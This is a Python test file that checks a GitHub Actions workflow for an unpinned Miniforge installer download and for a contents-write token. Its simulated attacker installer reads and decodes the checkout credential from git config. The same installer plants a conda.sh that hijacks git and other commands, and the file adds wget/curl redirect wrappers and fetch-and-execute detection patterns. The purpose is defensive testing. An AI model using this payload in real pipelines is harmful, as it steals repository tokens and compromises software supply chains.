#!/usr/bin/env python3
"""Failing tests for the CI Miniforge installer.

The main workflow downloads an installer and executes it in the same job that
later publishes documentation with the workflow token. These tests run that
install script against an attacker-controlled response and read the workflow's
token permissions. They fail until the installer bytes cannot run unless a
checksum pinned in this file matches them, and until the job that runs the
installer (or code the installer wrote) cannot write repository contents.
"""

from __future__ import annotations

import base64
import hashlib
import http.server
import os
import re
import shlex
import shutil
import subprocess
import tempfile
import threading
import unittest
import urllib.parse
from pathlib import Path

import yaml

REPO_ROOT = Path(__file__).resolve().parents[1]
WORKFLOW_PATH = REPO_ROOT / ".github" / "workflows" / "main.yml"
PLACEHOLDER_TOKEN = "placeholder-workflow-token"
INSTALLER_NAME_DEFAULT = "Miniforge3.sh"


class WorkflowLoader(yaml.SafeLoader):
    """Safe loader that keeps the workflow key `on` as a string."""


for _first, _entries in list(WorkflowLoader.yaml_implicit_resolvers.items()):
    WorkflowLoader.yaml_implicit_resolvers[_first] = [
        (tag, regexp)
        for tag, regexp in _entries
        if tag != "tag:yaml.org,2002:bool"
    ]


def load_workflow() -> dict:
    text = WORKFLOW_PATH.read_text()
    data = yaml.load(text, Loader=WorkflowLoader)
    if not isinstance(data, dict) or "jobs" not in data:
        raise AssertionError(f"{WORKFLOW_PATH} has no jobs")
    return data


def step_run(step: dict) -> str:
    run = step.get("run")
    if run is None:
        return ""
    return run if isinstance(run, str) else str(run)


def is_checkout(step: dict) -> bool:
    uses = str(step.get("uses") or "")
    return uses.startswith("actions/checkout@")


def checkout_persists_credentials(job: dict) -> bool:
    """actions/checkout persists the token unless persist-credentials is false.

    action.yml for actions/checkout v4 sets persist-credentials default true,
    and the action removes the token before the step returns only when that
    input is false.
    """
    for step in job.get("steps") or []:
        if not is_checkout(step):
            continue
        raw = (step.get("with") or {}).get("persist-credentials", True)
        if isinstance(raw, str):
            return raw.strip().lower() not in {"false", "no", "0"}
        return bool(raw)
    return False


def contents_can_write(permissions) -> bool:
    """Return whether the effective GITHUB_TOKEN can write repository contents.

    With no permissions key, the token uses the repository default. This
    organization was created before the February 2023 read-only change, new
    repositories inherit that organization default, and the workflow does not
    narrow it. That default includes contents write. An explicit permissions
    map sets every omitted scope to none.
    """
    if permissions is None:
        return True
    if isinstance(permissions, str):
        value = permissions.strip()
        if value == "write-all":
            return True
        if value in {"read-all", ""}:
            return False
        return True
    if isinstance(permissions, dict):
        if len(permissions) == 0:
            return False
        return str(permissions.get("contents", "none")).strip() == "write"
    return True


def effective_permissions(workflow: dict, job: dict):
    if "permissions" in job:
        return job.get("permissions")
    if "permissions" in workflow:
        return workflow.get("permissions")
    return None


_FETCH_RE = re.compile(r"\b(wget|curl)\b")
_PIPE_EXEC_RE = re.compile(r"\|\s*(?:sudo\s+)?(?:bash|sh)\b")
_EXEC_RE = re.compile(
    r"(?:^|[;&|\n])\s*(?:bash|sh)\s+((?:-[^\s]+\s+)*)([^\s;|&]+)"
)


def step_fetches_and_executes(run: str) -> bool:
    if not run:
        return False
    if _PIPE_EXEC_RE.search(run) and _FETCH_RE.search(run):
        return True
    if not _FETCH_RE.search(run):
        return False
    for match in _EXEC_RE.finditer(run):
        target = match.group(2).strip("\"'")
        if target.startswith("-"):
            continue
        if target in {"conda", "git"}:
            continue
        return True
    return False


def step_runs_installer_output(run: str) -> bool:
    if not run:
        return False
    markers = (
        "conda.sh",
        "conda activate",
        "${HOME}/conda",
        "$HOME/conda",
        "${{ env.HOME }}/conda",
    )
    return any(marker in run for marker in markers)


def job_trusts_installer(job: dict) -> bool:
    for step in job.get("steps") or []:
        run = step_run(step)
        if step_fetches_and_executes(run) or step_runs_installer_output(run):
            return True
    return False


def install_scripts(job: dict) -> list[tuple[str, str | None]]:
    found = []
    for step in job.get("steps") or []:
        run = step_run(step)
        if step_fetches_and_executes(run):
            shell = step.get("shell")
            found.append((run, shell if isinstance(shell, str) else None))
    return found


def later_token_scripts(job: dict) -> list[str]:
    scripts = []
    for step in job.get("steps") or []:
        run = step_run(step)
        if not run or step_fetches_and_executes(run):
            continue
        if "secrets.GITHUB_TOKEN" in run or "github.token" in run:
            scripts.append(run)
    return scripts


def executed_targets(script: str) -> list[str]:
    targets = []
    for match in _EXEC_RE.finditer(script):
        target = match.group(2).strip("\"'")
        if target.startswith("-") or target in {"conda", "git"}:
            continue
        targets.append(target)
    return targets


def _download_output_name(line: str) -> str | None:
    patterns = (
        r"(?:-O|--output-document)\s+([^\s;|&]+)",
        r"--output-document=([^\s;|&]+)",
        r"(?:-o|--output)\s+([^\s;|&]+)",
        r"--output=([^\s;|&]+)",
    )
    for pattern in patterns:
        match = re.search(pattern, line)
        if match:
            return match.group(1).strip("\"'")
    return None


def download_count(script: str, filename: str) -> int:
    count = 0
    base = Path(filename).name
    for line in script.splitlines():
        if not _FETCH_RE.search(line):
            continue
        output = _download_output_name(line)
        if output is None:
            continue
        if Path(output).name == base or output == filename:
            count += 1
    return count


def substitute_expressions(script: str) -> str:
    """Substitute the expressions the runner evaluates before writing the step script."""
    replacements = {
        "${{ secrets.GITHUB_TOKEN }}": PLACEHOLDER_TOKEN,
        "${{ github.token }}": PLACEHOLDER_TOKEN,
        "${{ matrix.python-version }}": "3.10",
        "${{ github.repository }}": "Goliath-Research/pybedtools",
    }
    for old, new in replacements.items():
        script = script.replace(old, new)
    return script


def runner_argv(shell: str | None, script_path: str) -> list[str]:
    """Match actions/runner ScriptHandler for a Linux run step.

    An omitted shell is bash with the sh argument format `-e {0}`.
    An explicit `bash` shell uses `--noprofile --norc -e -o pipefail {0}`.
    """
    bash = shutil.which("bash") or "/usr/bin/bash"
    if not shell:
        return [bash, "-e", script_path]
    if shell == "bash":
        return [bash, "--noprofile", "--norc", "-e", "-o", "pipefail", script_path]
    if shell == "sh":
        return [shutil.which("sh") or "/bin/sh", "-e", script_path]
    if "{0}" in shell:
        return shlex.split(shell.replace("{0}", shlex.quote(script_path)))
    return [bash, "-e", script_path]


class AttackerInstallerServer:
    """Serves the bytes an attacker returns for the installer URL.

    A checksum URL receives a checksum of those same bytes, so a checksum
    downloaded from the attacker does not count as a pin.
    """

    def __init__(self) -> None:
        self.installer = self._installer_bytes()
        self.installer_sha256 = hashlib.sha256(self.installer).hexdigest()
        self.installer_output_name = INSTALLER_NAME_DEFAULT
        self.requests: list[str] = []
        handler = self._handler_type()
        self._httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.port = self._httpd.server_address[1]
        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()

    def close(self) -> None:
        self._httpd.shutdown()
        self._httpd.server_close()
        self._thread.join(timeout=5)

    def _installer_bytes(self) -> bytes:
        script = """#!/bin/bash
set +e
mkdir -p "$HOME"
echo executed > "$HOME/.ci-attacker-executed"
{
  echo "--- extraheader ---"
  git config --local --get-regexp 'extraheader' || true
  echo "--- decoded ---"
  hdr=$(git config --local --get 'http.https://github.com/.extraheader' || true)
  b64=${hdr#AUTHORIZATION: basic }
  if [ -n "$b64" ]; then
    printf '%s' "$b64" | base64 -d 2>/dev/null || true
    echo
  fi
} > "$HOME/.ci-attacker-captured"
mkdir -p "$HOME/conda/etc/profile.d"
cat > "$HOME/conda/etc/profile.d/conda.sh" << 'END'
# The install step writes this file. Later steps source it, so these
# functions run in the same shell as the documentation publish commands.
conda() { return 0; }
make() { return 0; }
cd() { return 0; }
git() {
  printf '%s\\n' "$*" >> "$HOME/.ci-attacker-git-args"
  return 0
}
END
exit 0
"""
        return script.encode()

    def _handler_type(self):
        owner = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt: str, *args) -> None:
                return

            def do_GET(self) -> None:  # noqa: N802
                parsed = urllib.parse.urlsplit(self.path)
                query = urllib.parse.parse_qs(parsed.query)
                output_name = (query.get("out") or [None])[0]
                name = Path(parsed.path).name
                is_checksum = bool(
                    re.search(r"sha(256|1)?|checksum|sums", name, re.I)
                )
                owner.requests.append(parsed.path)
                if output_name and not is_checksum:
                    owner.installer_output_name = output_name
                if is_checksum:
                    # The name inside the checksum file is the local installer
                    # name (-O), which is what sha256sum -c opens. Using the
                    # URL basename would point at a file the step did not write.
                    filename = owner.installer_output_name or INSTALLER_NAME_DEFAULT
                    body = f"{owner.installer_sha256}  {filename}\n".encode()
                else:
                    body = owner.installer
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        return Handler


def write_fetch_wrappers(bin_dir: Path, port: int) -> None:
    """Point wget/curl at the attacker server, then exec the real client."""
    text = f"""#!/usr/bin/env python3
import os
import sys
import urllib.parse

port = {port}
argv = sys.argv[1:]
output = None
index = 0
while index < len(argv):
    arg = argv[index]
    if arg in ("-O", "--output-document", "-o", "--output") and index + 1 < len(argv):
        output = argv[index + 1]
    elif arg.startswith("--output-document=") or arg.startswith("--output="):
        output = arg.split("=", 1)[1]
    index += 1

rewritten = []
for arg in argv:
    if arg.startswith("http://") or arg.startswith("https://"):
        parts = urllib.parse.urlsplit(arg)
        query = urllib.parse.parse_qs(parts.query)
        if output:
            query["out"] = [output]
        flat = {{key: values[0] for key, values in query.items() if values}}
        encoded = urllib.parse.urlencode(flat)
        arg = f"http://127.0.0.1:{{port}}{{parts.path or '/'}}"
        if encoded:
            arg = arg + "?" + encoded
    rewritten.append(arg)

real = "/usr/bin/" + os.path.basename(sys.argv[0])
os.execv(real, [real, *rewritten])
"""
    git_stub = """#!/bin/sh
# Local stand-in for git network commands. git config still runs so the
# install step can read the checkout credential the way a real job can.
if [ "$1" = "config" ] || [ "$1" = "init" ]; then
  exec /usr/bin/git "$@"
fi
printf '%s\\n' "$*" >> "$HOME/.git-wrapper-log"
exit 0
"""
    for name in ("wget", "curl"):
        path = bin_dir / name
        path.write_text(text)
        path.chmod(0o755)
    git_path = bin_dir / "git"
    git_path.write_text(git_stub)
    git_path.chmod(0o755)


def plant_checkout_credential(workspace: Path) -> None:
    """Write the git extraheader actions/checkout leaves in the work tree."""
    basic = base64.b64encode(
        f"x-access-token:{PLACEHOLDER_TOKEN}".encode()
    ).decode()
    subprocess.run(
        ["git", "init", "-q"],
        cwd=workspace,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        [
            "git",
            "config",
            "--local",
            "http.https://github.com/.extraheader",
            f"AUTHORIZATION: basic {basic}",
        ],
        cwd=workspace,
        check=True,
        capture_output=True,
    )


def run_step(argv: list[str], cwd: Path, env: dict) -> subprocess.CompletedProcess:
    return subprocess.run(
        argv,
        cwd=cwd,
        env=env,
        text=True,
        capture_output=True,
        timeout=30,
    )


class MiniforgeSupplyChainTest(unittest.TestCase):
    def test_attacker_bytes_do_not_run_or_take_the_token(self) -> None:
        workflow = load_workflow()
        job = workflow["jobs"]["build-and-test"]
        scripts = install_scripts(job)
        if not scripts:
            return

        server = AttackerInstallerServer()
        try:
            for script, shell in scripts:
                for target in executed_targets(script):
                    fetches = download_count(script, target)
                    self.assertLessEqual(
                        fetches,
                        1,
                        f"{target} is downloaded {fetches} times in the install "
                        "step. A second download between a checksum and execution "
                        "runs bytes that were not the bytes just checked.",
                    )
                self._run_job_with_attacker(job, script, shell, server)
        finally:
            server.close()

    def _run_job_with_attacker(self, job, script, shell, server) -> None:
        with tempfile.TemporaryDirectory(prefix="miniforge-ci-") as tmp:
            root = Path(tmp)
            home = root / "home"
            workspace = root / "workspace"
            bin_dir = root / "bin"
            home.mkdir()
            workspace.mkdir()
            bin_dir.mkdir()
            write_fetch_wrappers(bin_dir, server.port)
            if checkout_persists_credentials(job):
                plant_checkout_credential(workspace)

            env = {
                "PATH": f"{bin_dir}:/usr/bin:/bin",
                "HOME": str(home),
                "GITHUB_REPOSITORY": "Goliath-Research/pybedtools",
                "GITHUB_REF": "refs/heads/master",
                "TMPDIR": tmp,
            }
            install_path = root / "install.sh"
            install_path.write_text(substitute_expressions(script))
            install = run_step(runner_argv(shell, str(install_path)), workspace, env)

            for index, later in enumerate(later_token_scripts(job)):
                path = root / f"later-{index}.sh"
                path.write_text(substitute_expressions(later))
                run_step(runner_argv(None, str(path)), workspace, env)

            executed = (home / ".ci-attacker-executed").exists()
            captured = (home / ".ci-attacker-captured").read_text() if (
                home / ".ci-attacker-captured"
            ).exists() else ""
            git_args = (home / ".ci-attacker-git-args").read_text() if (
                home / ".ci-attacker-git-args"
            ).exists() else ""
            conda_sh = home / "conda" / "etc" / "profile.d" / "conda.sh"
            poisoned = conda_sh.exists() and "ci-attacker-git-args" in conda_sh.read_text()
            self.assertFalse(
                executed or poisoned or PLACEHOLDER_TOKEN in captured or PLACEHOLDER_TOKEN in git_args,
                "Attacker-controlled installer bytes ran inside the workflow job.\n"
                f"executed={executed} poisoned_conda_sh={poisoned}\n"
                f"install exit={install.returncode}\n"
                f"install stderr:\n{install.stderr}\n"
                f"captured credential file:\n{captured}\n"
                f"git arguments seen by installer-written conda.sh:\n{git_args}\n"
                f"attacker requests: {server.requests}\n"
                "Pin the installer URL to a checksum that is stored in the "
                "workflow, verify that checksum before executing, and do not "
                "fetch the checksum from the same host that serves the installer.",
            )

    def test_installer_job_token_cannot_write_contents(self) -> None:
        workflow = load_workflow()
        writable = []
        for name, job in workflow["jobs"].items():
            if not job_trusts_installer(job):
                continue
            permissions = effective_permissions(workflow, job)
            if contents_can_write(permissions):
                writable.append(f"{name} permissions={permissions!r}")
        self.assertFalse(
            writable,
            "Jobs that execute the installer, or that source the conda prefix "
            "it writes, still receive a contents-write workflow token: "
            + ", ".join(writable)
            + ". Give those jobs contents: read (or no contents write) and "
            "move the documentation push to a job that does not run that installer.",
        )


if __name__ == "__main__":
    unittest.main()
